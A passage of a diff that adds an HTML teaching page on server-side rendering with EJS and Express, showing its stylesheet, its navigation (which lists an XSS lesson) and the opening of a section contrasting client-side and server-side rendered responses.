@@ -1,0 +1,1512 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>EJS & Server-Side Rendering</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Fraunces:ital,wght@0,300;0,600;0,700;0,900;1,300&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+/* VOICE: Sheryians classroom notes — calm paper, confident serif headings, dark code.
+   IDEA: a printed course handout with a working "race to first paint" demo.
+   PICTURE: step-through CSR vs SSR browser race; live XSS lab.
+   COLOUR and TYPE: the Sheryians design system tokens and three fonts, unchanged.
+   LAYOUT: sticky ink sidebar + scrolling paper main column. */
+
+/* ── Design Tokens ── */
+:root {
+  color-scheme: light;
+  --ink:       #0E0F14;
+  --paper:     #F5F2EB;
+  --paper2:    #EDE9DF;
+  --paper3:    #E4DFD3;
+  --rule:      #D4CEBC;
+  --muted:     #6B6455;
+  --accent:    #C84B1F;
+  --accent2:   #1A6B4A;
+  --accent3:   #1B4587;
+  --gold:      #B8860B;
+  --code-bg:   #1A1C24;
+  --code-text: #E2DCCC;
+  --flag-c:    #5BA4CF;
+  --val-c:     #F4A261;
+}
+
+/* ── Typography & Resets ── */
+*, *::before, *::after { box-sizing: border-box; min-width: 0; }
+html { scroll-behavior: smooth; scroll-padding-top: 24px; }
+body {
+  background-color: var(--paper);
+  color: var(--ink);
+  font-family: 'DM Sans', sans-serif;
+  font-size: 15px;
+  line-height: 1.7;
+  margin: 0;
+  overflow-x: clip;
+}
+
+/* ── Keyframe Animations ── */
+@keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes slideInLeft { from { opacity: 0; transform: translateX(-40px); } to { opacity: 1; transform: translateX(0); } }
+@keyframes slideInRight { from { opacity: 0; transform: translateX(40px); } to { opacity: 1; transform: translateX(0); } }
+@keyframes floatPulse { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+@keyframes dataFlow { from { stroke-dashoffset: 200; } to { stroke-dashoffset: 0; } }
+@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes shimmer { 0%, 100% { opacity: 1; } 50% { opacity: 0.45; } }
+@keyframes loadbar { from { width: 0; } to { width: 85%; } }
+
+.animate-fade-up { animation: fadeUp 0.4s ease both; }
+.animate-slide-left { animation: slideInLeft 0.5s ease both; }
+.animate-slide-right { animation: slideInRight 0.5s ease both; }
+.animate-float-pulse { animation: floatPulse 2.5s ease-in-out infinite; }
+.animate-data-flow { animation: dataFlow 1.5s linear infinite; }
+
+/* ── Layout ── */
+.layout-container { display: flex; min-height: 100vh; }
+.sidebar {
+  width: 260px; flex-shrink: 0; background-color: var(--ink);
+  position: sticky; top: 0; height: 100vh; overflow-y: auto; padding: 32px 0 40px;
+}
+.main-content { flex: 1; max-width: calc(100% - 260px); padding: 56px 56px 80px; }
+.main-inner { max-width: 860px; }
+
+/* ── Sidebar ── */
+.nav-brand { padding: 0 24px; margin-bottom: 24px; }
+.nav-brand .logo { font-family: 'Fraunces', serif; font-size: 18px; font-weight: 700; color: #FFFFFF; }
+.nav-brand .logo .accent-dot { color: var(--accent); }
+.nav-brand .sub { font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: rgba(255,255,255,0.35); letter-spacing: 0.06em; margin-top: 2px; }
+.nav-group-label { font-family: 'IBM Plex Mono', monospace; font-size: 9px; color: rgba(255,255,255,0.25); letter-spacing: 0.12em; text-transform: uppercase; padding: 0 24px; margin-top: 16px; margin-bottom: 4px; }
+.nav-link {
+  display: flex; align-items: center; gap: 8px; padding: 10px 24px;
+  font-family: 'DM Sans', sans-serif; font-size: 12.5px; color: rgba(255,255,255,0.5);
+  border-left: 2px solid transparent; text-decoration: none;
+  transition: color 150ms ease, background-color 150ms ease;
+}
+.nav-link:hover { color: #FFFFFF; background-color: rgba(255,255,255,0.04); }
+.nav-link.active { color: #FFFFFF; border-left-color: var(--accent); background-color: rgba(200,75,31,0.08); }
+.nav-link:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; }
+.nav-num {
+  width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  background-color: rgba(255,255,255,0.08); font-family: 'IBM Plex Mono', monospace; font-size: 9px; border-radius: 4px; color: inherit;
+}
+.nav-link:hover .nav-num, .nav-link.active .nav-num { background-color: var(--accent); color: #FFFFFF; }
+
+/* ── Hero ── */
+.hero { margin-bottom: 64px; padding-bottom: 40px; border-bottom: 1px solid var(--rule); }
+.hero-eyebrow { font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: var(--accent); text-transform: uppercase; letter-spacing: 0.12em; margin-bottom: 14px; }
+.hero h1 { font-family: 'Fraunces', serif; font-size: clamp(36px, 5vw, 58px); font-weight: 900; color: var(--ink); line-height: 1.05; letter-spacing: -0.02em; margin: 0 0 18px; text-wrap: balance; }
+.hero h1 em { font-style: normal; color: var(--accent); }
+.hero-desc { font-family: 'DM Sans', sans-serif; font-size: 16px; color: var(--muted); max-width: 560px; line-height: 1.65; margin: 0 0 20px; }
+.hero-tags { display: flex; flex-wrap: wrap; gap: 8px; }
+.hero-tag { font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: var(--muted); border: 1px solid var(--rule); border-radius: 9999px; padding: 2px 12px; }
+
+/* ── Sections ── */
+.section-block { margin-bottom: 72px; }
+.section-header { display: flex; align-items: flex-start; gap: 16px; margin-bottom: 28px; }
+.section-header-text { padding-top: 4px; }
+.section-num-big { font-family: 'Fraunces', serif; font-size: 48px; font-weight: 900; color: var(--rule); user-select: none; line-height: 1; }
+.section-title { font-family: 'Fraunces', serif; font-size: 26px; font-weight: 700; color: var(--ink); line-height: 1.2; text-wrap: balance; }
+.section-subtitle { font-family: 'DM Sans', sans-serif; font-size: 13px; color: var(--muted); margin-top: 4px; }
+h3 { font-family: 'Fraunces', serif; font-size: 18px; font-weight: 600; color: var(--ink); margin-top: 28px; margin-bottom: 12px; }
+h4 { font-family: 'IBM Plex Mono', monospace; font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.08em; margin: 20px 0 8px; font-weight: 500; }
+p, li { font-family: 'DM Sans', sans-serif; font-size: 14.5px; color: #2A2720; line-height: 1.7; }
+p { margin: 0 0 12px; }
+ul, ol { margin: 0 0 14px; padding-left: 22px; }
+li { margin-bottom: 6px; }
+strong { color: var(--ink); font-weight: 500; }
+code {
+  font-family: 'IBM Plex Mono', monospace; font-size: 12px; color: var(--accent);
+  background-color: var(--paper3); border: 1px solid var(--rule); border-radius: 4px; padding: 2px 4px;
+  overflow-wrap: anywhere;
+}
+
+/* ── Concept / Note / Warning ── */
+.concept-box { background-color: var(--paper2); border-left: 3px solid var(--accent3); border-radius: 0 8px 8px 0; padding: 16px 20px; margin: 16px 0; }
+.concept-box-label { font-family: 'IBM Plex Mono', monospace; font-size: 9px; color: var(--accent3); text-transform: uppercase; letter-spacing: 0.12em; margin-bottom: 8px; }
+.concept-box-text { font-family: 'DM Sans', sans-serif; font-size: 14px; color: var(--ink); line-height: 1.65; margin: 0; }
+.concept-box-text + .concept-box-text { margin-top: 8px; }
+.note-box { background-color: #FEF9EC; border: 1px solid #EDD97A; border-radius: 8px; padding: 12px 16px; margin: 16px 0; display: flex; gap: 12px; align-items: flex-start; }
+.note-box-icon, .warning-box-icon { font-size: 18px; line-height: 1; margin-top: 2px; }
+.note-box-text { font-family: 'DM Sans', sans-serif; font-size: 13px; color: #5C4A00; margin: 0; }
+.note-box-text strong { color: #3D3000; }
+.warning-box { background-color: #FEF2F2; border: 1px solid #FCA5A5; border-radius: 8px; padding: 12px 16px; margin: 16px 0; display: flex; gap: 12px; align-items: flex-start; }
+.warning-box-text { font-family: 'DM Sans', sans-serif; font-size: 13px; color: #7F1D1D; margin: 0; }
+.warning-box-text strong { color: #5F1212; }
+.note-box-text code, .warning-box-text code { font-size: 11.5px; }
+
+/* ── Badges ── */
+.badge { display: inline-block; font-family: 'IBM Plex Mono', monospace; font-size: 10px; font-weight: 600; color: #FFFFFF; text-transform: uppercase; letter-spacing: 0.06em; padding: 2px 10px; border-radius: 4px; }
+.badge-accent { background-color: var(--accent); }
+.badge-green  { background-color: var(--accent2); }
+.badge-blue   { background-color: var(--accent3); }
+.badge-gold   { background-color: var(--gold); }
+.step-row { margin: 28px 0 8px; }
+
+/* ── Code ── */
+.code-block { border-radius: 8px; overflow: hidden; border: 1px solid rgba(255,255,255,0.06); margin: 16px 0; }
+.code-header { display: flex; align-items: center; justify-content: space-between; padding: 8px 16px; background-color: #13141A; border-bottom: 1px solid rgba(255,255,255,0.06); }
+.code-label { font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 0.08em; }
+.code-copy-btn { background: none; border: none; font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 0.06em; cursor: pointer; transition: color 150ms ease; padding: 6px 0 6px 12px; }
+.code-copy-btn:hover, .code-copy-btn:focus-visible { color: rgba(255,255,255,0.7); }
+.code-pre { background-color: var(--code-bg); color: var(--code-text); font-family: 'IBM Plex Mono', monospace; font-size: 12.5px; line-height: 1.75; padding: 16px 20px; overflow-x: auto; margin: 0; }
+.token-command  { color: #87CEEB; font-weight: bold; }
+.token-flag     { color: #5BA4CF; }
+.token-val      { color: #F4A261; }
+.token-string   { color: #98C379; }
+.token-comment  { color: rgba(255,255,255,0.3); font-style: italic; }
+.token-yaml-key { color: #C678DD; }
+.token-operator { color: #E5C07B; }
+.code-pair { display: grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: 14px; margin: 16px 0; }
+.code-pair .code-block { margin: 0; }
+.pair-label { margin-bottom: 8px; }
+
+/* ── Tables ── */
+.table-wrap { overflow-x: auto; margin: 16px 0; }
+.table-wrap table { margin: 0; }
+.flag-table { width: 100%; border-collapse: collapse; font-family: 'DM Sans', sans-serif; font-size: 14px; margin: 16px 0; }
+.flag-table th { font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; background-color: var(--paper3); text-align: left; padding: 8px 12px; border: 1px solid var(--rule); font-weight: 500; }
+.flag-table td { padding: 8px 12px; border: 1px solid var(--rule); vertical-align: top; }
+.flag-table tbody tr { transition: background-color 100ms ease; }
+.flag-table tbody tr:hover { background-color: var(--paper2); }
+.flag-name { font-family: 'IBM Plex Mono', monospace; font-size: 12px; font-weight: 600; color: var(--flag-c); white-space: nowrap; }
+.flag-val { font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: var(--val-c); }
+.flag-table td code, .compare-table td code { white-space: nowrap; }
+.compare-table { width: 100%; border-collapse: collapse; font-family: 'DM Sans', sans-serif; font-size: 14px; margin: 16px 0; border-radius: 8px; overflow: hidden; }
+.compare-table th { background-color: var(--ink); color: #FFFFFF; font-size: 13px; font-weight: 600; text-align: left; padding: 12px 16px; border: 1px solid var(--ink); }
+.compare-table td { font-size: 13px; padding: 12px 16px; border: 1px solid var(--rule); vertical-align: top; }
+.compare-table tbody tr { transition: background-color 100ms ease; }
+.compare-table tbody tr:hover { background-color: var(--paper2); }
+.compare-table .cell-title { font-weight: 600; color: var(--ink); }
+.compare-table .cell-muted { color: var(--muted); }
+.compare-table .cell-highlight { color: var(--accent2); font-weight: 500; }
+
+/* ── Flow & scale diagrams ── */
+.flow-diagram { display: flex; flex-direction: column; gap: 0; margin: 16px 0; }
+.flow-step { display: flex; gap: 16px; }
+.flow-connector { display: flex; flex-direction: column; align-items: center; }
+.flow-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; margin-top: 6px; }
+.flow-dot-accent { background-color: var(--accent); }
+.flow-dot-green  { background-color: var(--accent2); }
+.flow-line { width: 2px; background-color: var(--rule); flex: 1; margin: 4px 0; }
+.flow-content { padding-bottom: 16px; }
+.flow-title { font-family: 'DM Sans', sans-serif; font-size: 14px; font-weight: 600; color: var(--ink); }
+.flow-desc { font-family: 'DM Sans', sans-serif; font-size: 12.5px; color: var(--muted); margin-top: 2px; }
+.scale-diagram { background-color: var(--paper2); border: 1px solid var(--rule); border-radius: 10px; padding: 16px 20px; margin: 16px 0; font-family: 'IBM Plex Mono', monospace; font-size: 12px; line-height: 2; color: var(--muted); overflow-x: auto; }
+.scale-diagram .highlight { color: var(--ink); font-weight: bold; }
+.scale-diagram .green { color: var(--accent2); }
+.scale-diagram .red { color: var(--accent); }
+.divider { border: none; border-top: 1px solid var(--rule); margin: 40px 0; }
+
+/* ── Step-through: race to first paint ── */
+.stepper { background-color: var(--paper2); border: 1px solid var(--rule); border-radius: 12px; padding: 20px; margin: 20px 0 24px; }
+.stepper-caption { font-family: 'Fraunces', serif; font-size: 17px; font-weight: 600; color: var(--ink); margin: 0 0 16px; min-height: 26px; }
+.lanes { display: grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: 16px; }
+.lane { background: #FFFFFF; border: 1px solid var(--rule); border-radius: 10px; padding: 14px; }
+.lane-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
+.lane-status { font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; }
+.lane-status.done { color: var(--accent2); font-weight: 600; }
+.browser { border: 1px solid var(--rule); border-radius: 8px; overflow: hidden; background: #FFFFFF; }
+.browser-bar { display: flex; align-items: center; gap: 5px; padding: 6px 10px; background: var(--paper3); border-bottom: 1px solid var(--rule); }
+.browser-bar i { width: 7px; height: 7px; border-radius: 50%; background: var(--rule); display: block; }
+.browser-bar span { margin-left: 6px; font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: var(--muted); background: var(--paper); border-radius: 4px; padding: 1px 8px; flex: 1; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+.browser-body { height: 150px; position: relative; padding: 10px; overflow: hidden; }
+.scr-center { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 8px; font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: #B5AE9C; }
+.spinner { width: 22px; height: 22px; border: 3px solid var(--paper3); border-top-color: var(--accent3); border-radius: 50%; animation: spin 0.8s linear infinite; }
+.sk { background: var(--paper3); border-radius: 4px; animation: shimmer 1.2s ease-in-out infinite; }
+.shop-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+.shop-logo { font-family: 'Fraunces', serif; font-weight: 700; font-size: 12px; color: var(--ink); }
+.shop-cart { font-family: 'IBM Plex Mono', monospace; font-size: 9px; color: var(--muted); }
+.shop-grid { display: grid; grid-template-columns: repeat(3, minmax(0,1fr)); gap: 6px; }
+.card-p { border: 1px solid var(--rule); border-radius: 6px; padding: 5px; }
+.card-p .img { height: 42px; border-radius: 4px; margin-bottom: 4px; }
+.card-p .nm { font-size: 9px; color: var(--ink); line-height: 1.3; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.card-p .pr { font-family: 'IBM Plex Mono', monospace; font-size: 9px; color: var(--accent2); font-weight: 600; }
+.loadbar { position: absolute; top: 0; left: 0; height: 3px; background: var(--accent); animation: loadbar 1.4s ease-out infinite; }
+.dim { opacity: 0.35; }
+.wire { display: flex; align-items: center; gap: 8px; margin: 12px 0 6px; }
+.node { font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: var(--ink); background: var(--paper2); border: 1px solid var(--rule); border-radius: 4px; padding: 2px 8px; flex-shrink: 0; }
+.wire-mid { flex: 1; position: relative; height: 34px; }
+.wire-mid svg { position: absolute; left: 0; right: 0; bottom: 4px; width: 100%; height: 8px; overflow: visible; }
+.wire-label { position: absolute; top: 0; left: 0; right: 0; text-align: center; font-family: 'IBM Plex Mono', monospace; font-size: 10px; color: var(--accent); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.wire-mid line { stroke: var(--rule); stroke-width: 2; }
+.wire-mid line.flowing { stroke: var(--accent); stroke-dasharray: 6 6; }
+.wire-mid line.reverse { animation-direction: reverse; }
+.lane-log { font-size: 12.5px; color: var(--muted); margin: 6px 0 0; min-height: 60px; line-height: 1.55; }
+.stepper-controls { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-top: 16px; flex-wrap: wrap; }
+.step-btn {
+  font-family: 'IBM Plex Mono', monospace; font-size: 11px; text-transform: uppercase; letter-spacing: 0.06em;
+  color: var(--ink); background: var(--paper); border: 1px solid var(--rule); border-radius: 6px;
+  min-height: 40px; padding: 8px 16px; cursor: pointer; transition: all 150ms ease;
+}
+.step-btn:hover:not(:disabled) { border-color: var(--accent); color: var(--accent); }
+.step-btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+.step-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+.step-btn.primary { background: var(--ink); color: #FFFFFF; border-color: var(--ink); }
+.step-btn.primary:hover:not(:disabled) { background: var(--accent); border-color: var(--accent); color: #FFFFFF; }
+.step-counter { font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 0.06em; }
+.step-dots { display: flex; gap: 6px; }
+.step-dots span { width: 8px; height: 8px; border-radius: 50%; background: var(--rule); }
+.step-dots span.on { background: var(--accent); }
+
+/* ── XSS lab ── */
+.lab { background-color: var(--ink); border-radius: 12px; padding: 22px; margin: 20px 0 24px; color: #FFFFFF; }
+.lab-title { font-family: 'Fraunces', serif; font-size: 18px; font-weight: 600; margin: 0 0 4px; color: #FFFFFF; }
+.lab-sub { font-size: 13px; color: rgba(255,255,255,0.55); margin: 0 0 16px; }
+.lab label { display: block; font-family: 'IBM Plex Mono', monospace; font-size: 10px; text-transform: uppercase; letter-spacing: 0.08em; color: rgba(255,255,255,0.45); margin-bottom: 6px; }
+.lab input {
+  width: 100%; font-family: 'IBM Plex Mono', monospace; font-size: 16px; color: #FFFFFF;
+  background: var(--code-bg); border: 1px solid rgba(255,255,255,0.14); border-radius: 8px; padding: 11px 14px;
+}
+.lab input:focus { outline: 2px solid var(--accent); outline-offset: 1px; }
+.lab-row { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0 16px; }
+.chip {
+  font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: rgba(255,255,255,0.7); background: transparent;
+  border: 1px solid rgba(255,255,255,0.16); border-radius: 9999px; padding: 6px 12px; min-height: 34px; cursor: pointer; transition: all 150ms ease;
+}
+.chip:hover, .chip:focus-visible { border-color: var(--accent); color: #FFFFFF; outline: none; }
+.chip.on { background: var(--accent); border-color: var(--accent); color: #FFFFFF; }
+.lab-grid { display: grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: 14px; }
+.lab-pane h4 { color: rgba(255,255,255,0.45); margin: 0 0 8px; font-size: 10px; }
+.lab-pane .code-pre { border-radius: 8px; min-height: 96px; white-space: pre-wrap; word-break: break-all; border: 1px solid rgba(255,255,255,0.06); }
+.lab-result { border-radius: 8px; min-height: 96px; padding: 14px 16px; font-size: 13.5px; line-height: 1.55; border: 1px solid rgba(255,255,255,0.08); }
+.lab-result.safe { background: rgba(26,107,74,0.18); border-color: rgba(26,107,74,0.6); }
+.lab-result.danger { background: rgba(200,75,31,0.18); border-color: rgba(200,75,31,0.7); }
+.lab-result.neutral { background: rgba(255,255,255,0.04); }
+.lab-result .verdict { font-family: 'IBM Plex Mono', monospace; font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; display: block; }
+.lab-result.safe .verdict { color: #6FD3A4; }
+.lab-result.danger .verdict { color: #FF9C74; }
+.lab-result.neutral .verdict { color: #E5C07B; }
+.lab-result .shown { font-family: 'DM Sans', sans-serif; color: #FFFFFF; background: rgba(255,255,255,0.06); border-radius: 6px; padding: 6px 10px; margin-top: 8px; word-break: break-all; }
+.lab-result p { color: rgba(255,255,255,0.8); font-size: 13px; margin: 0; }
+
+/* ── Quiz ── */
+.quiz-box { background-color: var(--ink); border-radius: 12px; padding: 24px; margin: 32px 0; border: 1px solid rgba(255,255,255,0.08); }
+.quiz-tag { font-family: 'IBM Plex Mono', monospace; font-size: 9px; color: var(--accent); text-transform: uppercase; letter-spacing: 0.12em; margin-bottom: 10px; }
+.quiz-question { font-family: 'DM Sans', sans-serif; font-size: 15px; color: #FFFFFF; font-weight: 500; line-height: 1.6; margin-bottom: 20px; }
+.quiz-options { display: flex; flex-direction: column; gap: 12px; }
+.quiz-option { text-align: left; font-family: 'DM Sans', sans-serif; font-size: 13.5px; color: rgba(255,255,255,0.7); background: transparent; border: 1px solid rgba(255,255,255,0.12); border-radius: 8px; padding: 12px 16px; cursor: pointer; transition: all 200ms ease; min-height: 44px; }
+.quiz-option:hover:not(:disabled), .quiz-option:focus-visible { border-color: var(--accent); color: #FFFFFF; background-color: rgba(200,75,31,0.08); outline: none; }
+.quiz-option code, .quiz-question code { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.12); color: #F4A261; }
+.quiz-option.correct { border-color: var(--accent2) !important; background-color: rgba(26,107,74,0.15) !important; color: #FFFFFF !important; opacity: 1 !important; }
+.quiz-option.incorrect { border-color: var(--accent) !important; background-color: rgba(200,75,31,0.15) !important; color: #FFFFFF !important; opacity: 1 !important; }
+.cursor-not-allowed { cursor: not-allowed; }
+.quiz-feedback { margin-top: 16px; font-family: 'IBM Plex Mono', monospace; font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; }
+.quiz-feedback.correct { color: #3FB984; }
+.quiz-feedback.incorrect { color: #F07A50; }
+.quiz-feedback.hidden { display: none; }
+
+/* ── Footer ── */
+.site-footer { display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: var(--muted); border-top: 2px solid var(--rule); padding-top: 16px; margin-top: 64px; }
+
+/* ── Narrow screens ── */
+@media (max-width: 900px) {
+  .layout-container { flex-direction: column; }
+  .sidebar { width: 100%; height: auto; position: sticky; top: 0; z-index: 10; padding: 10px 0; display: flex; align-items: center; overflow-x: auto; overflow-y: hidden; }
+  .nav-brand { margin: 0; padding: 0 16px; flex-shrink: 0; }
+  .nav-brand .sub, .nav-group-label { display: none; }
+  .nav-link { flex-shrink: 0; padding: 10px 12px; border-left: 0; border-bottom: 2px solid transparent; white-space: nowrap; }
+  .nav-link.active { border-bottom-color: var(--accent); }
+  .main-content { max-width: 100%; padding: 40px 32px 64px; }
+  html { scroll-padding-top: 72px; }
+}
+@media (max-width: 768px) {
+  .main-content { padding: 32px 18px 64px; }
+  .lanes, .lab-grid, .code-pair { grid-template-columns: minmax(0,1fr); }
+  .section-num-big { font-size: 36px; }
+  .compare-table th, .compare-table td { padding: 10px 12px; }
+}
+@media (max-width: 600px) {
+  .table-wrap thead { display: none; }
+  .table-wrap table, .table-wrap tbody { display: block; }
+  .table-wrap tr { display: grid; padding: 10px 14px; border: 1px solid var(--rule); border-top: 0; background: var(--paper); }
+  .table-wrap tr:first-child { border-top: 1px solid var(--rule); border-radius: 8px 8px 0 0; }
+  .table-wrap tr:last-child { border-radius: 0 0 8px 8px; }
+  .table-wrap td, .compare-table td { display: block; border: 0; padding: 3px 0; }
+  .table-wrap td::before { content: attr(data-l); display: block; font-family: 'IBM Plex Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--muted); }
+  .table-wrap td:first-child::before { display: none; }
+  .table-wrap td:first-child { font-weight: 600; padding-bottom: 6px; }
+  .flag-table td code, .compare-table td code { white-space: normal; }
+}
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation: none !important; transition: none !important; }
+  html { scroll-behavior: auto; }
+}
+</style>
+</head>
+<body>
+<div class="layout-container">
+
+  <nav class="sidebar" aria-label="Sections">
+    <div class="nav-brand">
+      <div class="logo">EJS<span class="accent-dot">.</span>Render</div>
+      <div class="sub">Sheryians Coding School</div>
+    </div>
+
+    <div class="nav-group-label">The big picture</div>
+    <a href="#ssr-vs-csr" class="nav-link active"><span class="nav-num">1</span>SSR vs CSR</a>
+    <a href="#csr-problems" class="nav-link"><span class="nav-num">2</span>Problems with CSR</a>
+    <a href="#how-ejs-works" class="nav-link"><span class="nav-num">3</span>How EJS works</a>
+    <a href="#modern-rendering" class="nav-link"><span class="nav-num">4</span>Rendering today</a>
+
+    <div class="nav-group-label">Hands-on EJS</div>
+    <a href="#setup" class="nav-link"><span class="nav-num">5</span>Setting up EJS</a>
+    <a href="#rendering" class="nav-link"><span class="nav-num">6</span>Rendering a page</a>
+    <a href="#tags" class="nav-link"><span class="nav-num">7</span>The four tags</a>
+    <a href="#xss" class="nav-link"><span class="nav-num">8</span>XSS attacks</a>
+    <a href="#control-flow" class="nav-link"><span class="nav-num">9</span>Control flow & loops</a>
+    <a href="#partials" class="nav-link"><span class="nav-num">10</span>Partials</a>
+
+    <div class="nav-group-label">Wrap up</div>
+    <a href="#cheatsheet" class="nav-link"><span class="nav-num">11</span>Cheat sheet</a>
+  </nav>
+
+  <main class="main-content">
+  <div class="main-inner">
+
+    <header class="hero animate-fade-up">
+      <div class="hero-eyebrow">Backend Domination · Templating</div>
+      <h1>Server-Side Rendering with <em>EJS</em></h1>
+      <p class="hero-desc">Before Next.js, before React, servers built every page themselves. Learn how that works, why the industry moved away from it and then partly came back, and how to build real server-rendered pages with Express and EJS.</p>
+      <div class="hero-tags">
+        <span class="hero-tag">SSR vs CSR</span>
+        <span class="hero-tag">Express</span>
+        <span class="hero-tag">EJS tags</span>
+        <span class="hero-tag">XSS</span>
+        <span class="hero-tag">Loops</span>
+        <span class="hero-tag">Partials</span>
+      </div>
+    </header>
+
+    <!-- ═════════════ 01 SSR vs CSR ═════════════ -->
+    <section class="section-block animate-fade-up" id="ssr-vs-csr">
+      <div class="section-header">
+        <div class="section-num-big">01</div>
+        <div class="section-header-text">
+          <div class="section-title">Server-Side vs Client-Side Rendering</div>
+          <div class="section-subtitle">Every page ends up as HTML. The real question is who builds it.</div>
+        </div>
+      </div>
+
+      <p>Whatever stack you use, the browser can only show HTML, CSS and JavaScript. So for every page, someone has to take your <strong>data</strong> (products, users, orders) and turn it into <strong>HTML</strong>. There are two places that can happen.</p>
+
+      <div class="concept-box">
+        <div class="concept-box-label">Key Concept</div>
+        <p class="concept-box-text"><strong>Server-Side Rendering (SSR)</strong> — the server fetches the data, builds the complete HTML page with the data already inside, and sends the finished page. The browser just displays it.</p>
+        <p class="concept-box-text"><strong>Client-Side Rendering (CSR)</strong> — the server sends an almost empty HTML file plus a JavaScript bundle. The browser runs the JS, calls an API for the data (JSON), and builds the page itself.</p>
+      </div>
+
+      <p>Think of a restaurant. SSR is the kitchen cooking your thali and serving it ready to eat. CSR is the waiter handing you a meal kit — raw ingredients plus a recipe — and you cook it at your table. Both end with food. One makes you wait longer before the first bite, and makes <em>your</em> stove do the work.</p>
+
+      <h3>What the browser actually receives</h3>
+      <p>Here is the first response for the same products page, built both ways. This is exactly what you see in <strong>View Page Source</strong>.</p>
+
+      <div class="code-pair">
+        <div>
+          <div class="pair-label"><span class="badge badge-blue">CSR response</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">GET /products → index.html</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-comment">&lt;!DOCTYPE html&gt;</span>
+<span class="token-flag">&lt;html</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;head</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;title</span><span class="token-flag">&gt;</span>Shop<span class="token-flag">&lt;/title</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;script</span> type=<span class="token-string">"module"</span> src=<span class="token-string">"/assets/index-a1b2.js"</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;/script</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;/head</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;body</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;div</span> id=<span class="token-string">"root"</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;/div</span><span class="token-flag">&gt;</span>
+    <span class="token-comment">&lt;!-- empty! JS will fill this later --&gt;</span>
+  <span class="token-flag">&lt;/body</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/html</span><span class="token-flag">&gt;</span></pre></div>
+        </div>
+        <div>
+          <div class="pair-label"><span class="badge badge-accent">SSR response</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">GET /products → finished page</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-comment">&lt;!DOCTYPE html&gt;</span>
+<span class="token-flag">&lt;html</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;head</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;title</span><span class="token-flag">&gt;</span>Products · Shop<span class="token-flag">&lt;/title</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;/head</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;body</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;h1</span><span class="token-flag">&gt;</span>All Products<span class="token-flag">&lt;/h1</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;ul</span><span class="token-flag">&gt;</span>
+      <span class="token-flag">&lt;li</span><span class="token-flag">&gt;</span>Oversized Tee — ₹799<span class="token-flag">&lt;/li</span><span class="token-flag">&gt;</span>
